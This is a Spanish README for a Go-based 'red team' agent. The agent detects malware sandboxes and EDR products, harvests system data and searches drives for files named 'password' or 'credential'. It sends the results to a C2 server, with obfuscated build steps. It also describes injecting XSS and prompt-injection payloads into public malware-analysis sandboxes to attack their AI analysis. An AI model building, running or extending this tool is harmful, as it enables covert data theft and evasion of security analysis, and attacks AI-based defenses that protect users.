# Sandbox Detection Agent

Agente de Red Team para detección y fingerprinting de sandboxes y entornos de análisis de malware.

## Estructura del Proyecto

```
.
├── main.go                 # Punto de entrada - Orquestador con 5 goroutines
├── config/
│   └── config.go          # Configuración global (URL servidor, timeouts)
├── collectors/
│   ├── sandbox.go         # CheckSandbox - Detección de VMs
│   ├── sysinfo.go         # SystemInfo - Info completa del sistema
│   ├── hooks.go           # HookDetector - Detección de hooks en ntdll
│   ├── crawler.go         # FileCrawler - Búsqueda de archivos
│   └── edr.go             # SharpEDRChecker - Detección EDR/AV
├── models/
│   └── payload.go         # Estructuras de datos JSON
├── utils/
│   └── screenshot.go      # Captura de pantalla (opcional)
└── exfil/
    └── sender.go          # Envío de datos al servidor C2
```

## Funcionalidades Implementadas

### 1. CheckSandbox (collectors/sandbox.go)
Detecta si el sistema está corriendo en un entorno virtualizado:
- ✅ Archivos de VirtualBox/VMware/Parallels
- ✅ Claves de registro de VMs
- ✅ Nombres de disco sospechosos (VBOX, VMware, QEMU)
- ✅ Temperatura de CPU (VMs no reportan)
- ✅ Número de ventanas abiertas (VMs tienen pocas)
- ✅ Privilegios de depuración (SeDebugPrivilege)

### 2. SystemInfo (collectors/sysinfo.go)
Recopila información completa del sistema:
- ✅ CPU, RAM, Disco (usando syscalls nativos)
- ✅ BIOS (vendor, version, fecha)
- ✅ Lista de procesos con PID, nombre, path y owner
- ✅ Usuarios locales (NetUserEnum)
- ✅ Grupos locales (NetLocalGroupEnum)
- ✅ Conexiones de red TCP/UDP activas (GetExtendedTcpTable)
- ✅ Servicios instalados (EnumServicesStatusEx)
- ✅ Variables de entorno
- ✅ Named pipes del sistema
- ✅ Posición del mouse (GetCursorPos)
- ✅ Aplicaciones instaladas (registro de Windows)
- ✅ Archivos recientes del usuario
- ✅ Uptime del sistema (GetTickCount64)
- ⚠️ Screenshot (implementado pero comentado por tamaño)

### 3. HookDetector (collectors/hooks.go)
Analiza funciones críticas en busca de hooks:
- ✅ 13 funciones de ntdll.dll monitoreadas
- ✅ Detecta patrones de hooks (JMP, PUSH+RET)
- ✅ Identifica DLLs sospechosas (Sandboxie, Comodo, Avast, etc)
- ✅ Lee primeros bytes de cada función

### 4. FileCrawler (collectors/crawler.go)
Busca archivos específicos en el sistema:
- ✅ Escanea todas las unidades montadas
- ✅ Búsqueda por patrones (extensiones, nombres)
- ✅ Evita directorios del sistema para optimizar
- ✅ Límite configurable de archivos

### 5. EDRChecker (collectors/edr.go)
Detecta 12 productos de seguridad:
- ✅ Windows Defender
- ✅ CrowdStrike Falcon
- ✅ SentinelOne
- ✅ Carbon Black
- ✅ Cylance
- ✅ Symantec Endpoint Protection
- ✅ McAfee Endpoint Security
- ✅ Kaspersky
- ✅ Trend Micro
- ✅ ESET
- ✅ Palo Alto Traps
- ✅ FireEye

Métodos de detección:
- Procesos en ejecución
- Drivers instalados (.sys)
- Claves de registro

### 6. XSS Audit (xss/)
Inyecta payloads XSS en múltiples vectores para auditar sandboxes:

#### Vectores de Inyección Básicos:
- ✅ Archivos (HTML, TXT, JSON, XML, MD)
- ✅ Registro de Windows (múltiples claves)
- ✅ Argumentos de procesos (CMD, PowerShell, Notepad)
- ✅ Variables de entorno
- ✅ Portapapeles
- ✅ Event Logs
- ✅ Shortcuts (.lnk)
- ✅ Tareas programadas (schtasks)
- ✅ Descripciones de servicios
- ✅ OutputDebugString

#### Vectores Avanzados (Nuevos):
- ✅ **Registry NLS** (T1012 - Checks supported languages)
  - Consulta claves de `HKLM\SYSTEM\ControlSet001\Control\Nls\Sorting\Versions`
  - Inyecta payloads en claves de idioma y teclado
  
- ✅ **Computer Name Queries** (Reads the computer name)
  - Múltiples métodos: hostname, %COMPUTERNAME%, WMI, registro
  - Inyecta payloads en claves relacionadas
  
- ✅ **DNS Queries** (Uses NSLOOKUP.EXE to check DNS info)
  - nslookup con diferentes tipos (A, MX, TXT, NS, AAAA)
  - PowerShell Resolve-DnsName
  - ipconfig /displaydns y /flushdns
  
- ✅ **Service Management** (Starts SC.EXE for service management)
  - sc query, qc, qdescription
  - Intento de creación de servicios con payloads
  - PowerShell Get-Service
  
- ✅ **Task Scheduler Avanzado**
  - schtasks con múltiples formatos (LIST, TABLE, CSV)
  - Creación de tareas ONCE, DAILY con payloads
  - PowerShell Register-ScheduledTask
  
- ✅ **WMI Queries Extensivas**
  - 15+ clases WMI consultadas
  - wmic y PowerShell Get-WmiObject
  - Get-CimInstance (WMI moderno)
  
- ✅ **NET Commands**
  - net user, localgroup, share, use, view
  - net config, session, time, statistics
  - Intento de creación de usuarios con payloads
  
- ✅ **NETSH Commands**
  - netsh interface, wlan, advfirewall
  - Configuración de red e IP
  
- ✅ **PowerShell Commands Adicionales**
  - Get-ComputerInfo, Get-Process, Get-Service
  - Get-NetAdapter, Get-NetIPAddress, Get-NetRoute
  - Get-ScheduledTask, Get-ExecutionPolicy
  - Get-MpComputerStatus (Windows Defender)
  - Múltiples flags: -NoProfile, -NonInteractive, -ExecutionPolicy Bypass
  
- ✅ **CMD Commands Adicionales**
  - systeminfo, ver, set
  - ipconfig /all, netstat -ano, arp -a, route print
  - tasklist, tasklist /svc
  - whoami, whoami /all
  - wmic (os, computersystem, bios, cpu, logicaldisk, product, service, startup)

#### Vectores Específicos por Sandbox:
- ✅ Any.Run (User-Agent, Process Names, File Names)
- ✅ Filescan.io (Metadata, File Content)
- ✅ Hybrid Analysis (Network Requests, Registry)
- ✅ Triage (Process Arguments, Environment)
- ✅ VirusTotal (File Names, Strings)

#### Prompt Injection para IAs:
- ✅ Payloads diseñados para atacar sistemas de análisis con IA
- ✅ Inyección en strings del binario para análisis estático

## Compilación

### Compilación básica
```bash
./build_agent.sh agent.exe
```

### Compilación para sandbox específica
```bash
# Para Any.Run
./build_agent.sh anyrun.exe ANY_RUN

# Para Filescan.io
./build_agent.sh filescan.exe FILESCAN

# Para Hybrid Analysis
./build_agent.sh hybrid.exe HYBRID_ANALYSIS

# Para Triage
./build_agent.sh triage.exe TRIAGE

# Para VirusTotal
./build_agent.sh virustotal.exe VIRUSTOTAL
```

### Compilación manual con Go
```bash
# Básica
GOOS=windows GOARCH=amd64 go build -o agent.exe

# Con target sandbox específico
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.targetSandbox=ANY_RUN" -o agent.exe
```

### Compilación optimizada (reducir tamaño)
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent.exe
```

### Compilación con ofuscación (usando garble)
```bash
go install mvdan.cc/garble@latest
GOOS=windows GOARCH=amd64 garble -literals -tiny build -o agent.exe
```

## Configuración

El agente se configura mediante variables de entorno:

```bash
# URL del servidor C2
export SERVER_URL="http://tu-servidor.com:8080/content"

# Habilitar modo debug
export DEBUG=1
```

Si no se especifica, usa valores por defecto:
- `SERVER_URL`: http://172.20.10.3:8080/content
- `DEBUG`: deshabilitado

## Uso

### Ejecución básica
```bash
./agent.exe
```

### Salida esperada
```
[*] Iniciando agente de detección de sandbox...
[+] Ejecutando CheckSandbox...
[+] Ejecutando SystemInfo...
[+] Ejecutando HookDetector...
[+] Ejecutando FileCrawler...
[+] Ejecutando EDRChecker...
[✓] CheckSandbox completado
[✓] SystemInfo completado
[✓] HookDetector completado
[✓] FileCrawler completado
[✓] EDRChecker completado

[*] Todos los colectores completados
[*] Exfiltrando datos...
[✓] Datos enviados correctamente al servidor

========== RESUMEN ==========
¿Es VM?: true
Indicadores de VM: 5
CPUs: 4
RAM: 8192 MB
Procesos: 127
Funciones hooked: 3/13
Archivos encontrados: 42
EDR/AV detectados: 1
  - Windows Defender (método: process)
=============================
```

## Formato del Payload JSON

El agente envía un JSON con toda la información recopilada:

```json
{
  "timestamp": "2025-11-28T10:30:00Z",
  "hostname": "DESKTOP-ABC123",
  "sandbox_info": {
    "is_vm": true,
    "vm_indicators": ["C:\\Windows\\System32\\drivers\\VBoxGuest.sys"],
    "registry_indicators": ["SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"],
    "disk_indicators": ["VBOX HARDDISK"],
    "cpu_temperature": 0.0,
    "window_count": 8,
    "has_debug_privilege": false
  },
  "system_info": {
    "os": "windows",
    "architecture": "amd64",
    "cpu_count": 4,
    "total_ram_mb": 8192,
    "total_disk_bytes": 107374182400,
    "bios": "American Megatrends Inc. 1.2.3 (01/01/2020)",
    "processes": [...],
    "users": ["Administrator", "User"],
    "groups": ["Administrators", "Users"],
    "network_connections": [...],
    "services": [...],
    "environment_variables": {...},
    "pipes": [...],
    "mouse_position": {"x": 1024, "y": 768},
    "installed_apps": [...],
    "recent_files": [...],
    "uptime_seconds": 86400
  },
  "hook_info": {
    "hooked_functions": [...],
    "suspicious_dlls": ["sbiedll.dll"]
  },
  "crawler_info": {
    "scanned_paths": ["C:\\", "D:\\"],
    "found_files": [...],
    "total_files": 42
  },
  "edr_info": {
    "detected_products": [...],
    "running_processes": [...],
    "installed_drivers": [...]
  }
}
```

## Personalización

### Modificar patrones de búsqueda de archivos
Edita `main.go` línea 52:
```go
patterns := []string{"*.txt", "*.doc", "*.pdf", "password", "credential"}
```

### Habilitar captura de pantalla
Descomenta en `collectors/sysinfo.go` línea 42:
```go
info.Screenshot = utils.CaptureScreenshot()
```

### Cambiar límites de recopilación
- Procesos: ilimitado
- Conexiones de red: 100 (línea 115 y 163 en sysinfo.go)
- Servicios: 200 (línea 283 en sysinfo.go)
- Aplicaciones: 500 (línea 318 en sysinfo.go)
- Archivos recientes: 50 (línea 343 en sysinfo.go)
- Named pipes: 100 (línea 395 en sysinfo.go)

## Notas de Seguridad

⚠️ **Este proyecto es solo para fines educativos y de Red Team autorizado**

- Requiere permisos de administrador para algunas funciones
- Puede ser detectado por EDR/AV modernos
- El tráfico de red no está cifrado (considera añadir TLS)
- No incluye persistencia ni evasión avanzada

## Próximas Mejoras

- [ ] Cifrado de comunicaciones (TLS/AES)
- [ ] Detección de debugging activo
- [ ] Análisis de timing para detectar sandboxes
- [ ] Verificación de interacción humana
- [ ] Detección de análisis de memoria
- [ ] Evasión de hooks mediante syscalls directos
- [ ] Persistencia opcional
- [ ] Modo stealth (reducir ruido)
